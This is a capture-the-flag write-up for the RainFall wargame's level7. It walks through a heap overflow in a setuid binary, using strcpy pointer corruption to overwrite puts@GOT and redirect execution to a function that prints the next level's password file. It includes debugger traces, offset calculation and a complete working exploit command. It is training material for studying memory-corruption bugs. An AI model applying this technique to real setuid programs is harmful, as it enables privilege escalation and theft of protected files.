# LEVEL7 - Heap Overflow & GOT Overwrite

> Vulnerability class: Heap Buffer Overflow
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, objdump, ltrace, file

---

## Overview

The program allocates four heap buffers with `malloc()` and copies two `argv` inputs via `strcpy()`. By overflowing the first `strcpy()`, we control the destination pointer of the second `strcpy()`, giving us an arbitrary write primitive. We use this to overwrite `puts@GOT` with the address of `m()`, which reads and prints the password file via `printf()`.

---

## 1. Reconnaissance

```bash
level7@RainFall:~$ file level7 
   level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not strippedlevel7@RainFall:~$ file level7 
```
```bash
   level7@RainFall:~$ checksec --file ./level7 
   RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
   No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level7
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: library functions resolved at runtime via PLT/GOT
- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
- No stack canary: the saved return address can be overwritten without triggering any detection
- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable

---

## 2. Static Analysis

### 2.1 Program behavior

The program requires exactly two arguments otherwie it segfaults:
```bash
   level7@RainFall:~$ ./level7
   Segmentation fault (core dumped)
   level7@RainFall:~$ ./level7 a
   Segmentation fault (core dumped)
   level7@RainFall:~$ ./level7 a a
   ~~
```

### 2.2 Heap layout

Four consecutive `malloc(8)` calls produce heap chunks spaced 16 bytes apart:
```bash
   malloc(8) → 0x804a008   # chunk 1: stores pointer to chunk 2
   malloc(8) → 0x804a018   # chunk 2: receives argv[1] via strcpy
   malloc(8) → 0x804a028   # chunk 3: stores pointer to chunk 4
   malloc(8) → 0x804a038   # chunk 4: receives argv[2] via strcpy
```

`strcpy` calls copy into the second and fourth chunks:
```bash
   strcpy(0x0804a018, argv[1])
   strcpy(0x0804a038, argv[2])
```

### 2.3 The `m()` function

`m()` is never called by normal control flow. It reads from an uninitialized global `c` at `0x8049960` in `.bss` and prints it with `printf()`:
```asm
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)         ; c (globak, .bss)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
```
With `objdump` we find:
```
   08049960 <c>:
```

### 2.4 Password file read

`fopen()` opens `/home/user/level8/.pass` in read mode and `fgets()` stores its content into `c`. When `m()` is triggered, `printf()` prints whatever `fgets()` wrote there — the password.
```bash
   Breakpoint 7, 0xb7e90e60 in fopen () from /lib/i386-linux-gnu/libc.so.6
   (gdb) x/3wx $esp
   0xbffff6fc:     0x080485d8      0x080486eb      0x080486e9
   (gdb) x/s 0x080486eb
   0x80486eb:       "/home/user/level8/.pass"
```
```
   fgets(-> c at 0x8049960, ...)
```

### 2.5 Normal control flow ends with `puts()`

At the end of `main()`, the program calls `puts("~~")`:
```asm
   0x080485f0 <+207>:    movl   $0x8048703, (%esp)    ; "~~"
   0x080485f7 <+214>:    call   0x8048400 <puts@plt>
```

Goal: overwrite `puts@GOT` with the address of `m()` so that when `puts("~~")` is called, `m()` executes instead and prints the password.

---

## 3. Vulnerability

`strcpy()` performs no bounds checking. The first `strcpy()` writes `argv[1]` into chunk 2 (`0x804a018`), which sits 16 bytes before chunk 3 (`0x804a028`). Chunk 3 holds the destination pointer used by the second `strcpy()`. Overflowing chunk 2 overwrites this pointer, giving us full control over where the second `strcpy()` writes — an arbitrary write primitive.

```bash
   level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBB
   __libc_start_main(0x8048521, 3, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
   malloc(8)                                                                                                       = 0x0804a008
   malloc(8)                                                                                                       = 0x0804a018
   malloc(8)                                                                                                       = 0x0804a028
   malloc(8)                                                                                                       = 0x0804a038
   strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAA")                                                                    = 0x0804a018
   strcpy(0x08004141, "BBBBBBBBBBBBBBBBBB" <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
```

---

## 4. Exploitation

### 4.1 Offset calculation

The destination pointer of the second `strcpy()` lives in chunk 3 at `0x804a028`, which is 16 bytes past the start of chunk 2 at `0x804a018`. Adding 4 bytes for the chunk header gives an offset of 20 bytes:

```bash
   level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAAAA test
   strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAA")                                                                 = 0x0804a018
   strcpy(0x41414141, "test" <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
```
Full 4-byte overwrite confirmed at 20+4.

### 4.2 Locating `puts@GOT`

```bash
   level7@RainFall:~$ objdump -R ./level7 | grep "puts"
   08049928 R_386_JUMP_SLOT   puts
```

### 4.3 Payload construction

```txt
   argv[1]: [ 20 bytes padding ] + [ puts@GOT address ]
   argv[2]: [ address of m()   ]
```

- 20 bytes of `A` fill chunk 2 up to the destination pointer in chunk 3
- `\x28\x99\x04\x08` — overwrites the destination pointer with `puts@GOT` (`0x08049928`)
- The second `strcpy()` then writes `\xf4\x84\x04\x08` (address of `m()`) into `puts@GOT`

When `main()` calls `puts("~~")`, the GOT entry now points to `m()`, which prints the password.


### 4.4 Execution

```bash
   level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   - 1762942544
```

---

## 5. Key Takeaways

| Concept | Detail |
|---|---|
| `strcpy()` is unsafe | No bounds checking — overflows adjacent heap memory |
| Heap pointer corruption | Overflowing one chunk corrupts the destination pointer of a subsequent `strcpy()` |
| Arbitrary write primitive | Controlling a `strcpy()` destination = write anything anywhere |
| GOT overwrite | Replacing a GOT entry redirects all future calls to that function |
| Dead code reachability | `m()` is never called normally but becomes reachable via GOT hijacking |
| fgets → .bss → printf | The password is read into a global variable and printed when `m()` is triggered |
